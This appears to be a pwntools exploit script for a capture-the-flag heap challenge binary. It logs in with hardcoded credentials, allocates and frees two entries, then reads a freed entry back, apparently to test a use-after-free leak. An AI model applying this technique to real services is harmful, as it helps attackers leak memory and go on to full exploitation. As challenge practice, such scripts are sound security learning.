from pwn import *
context.log_level='error'
p=process('./pwn', cwd='.')
def menu(n):
    p.sendlineafter(b'> ',str(n).encode())
def save(i,d):
    menu(1); p.sendlineafter(b'Input the key: ',str(i).encode()); p.sendlineafter(b'Input the value size: ',b'8'); p.sendafter(b'Input the value: ',d)
def delete(i):
    menu(3); p.sendlineafter(b'Input the key: ',str(i).encode())
def readv(i):
    menu(2); p.sendlineafter(b'Input the key: ',str(i).encode()); return p.recvuntil(b'Encrypt and save value...',timeout=1)
p.sendlineafter(b'Input your username:',b'admin'); p.sendlineafter(b'Input your password:',b's4cur1ty_p4ssw0rd')
save(0,b'AAAAAAAA'); save(1,b'BBBBBBBB'); delete(0); delete(1)
print(readv(0))
p.close()
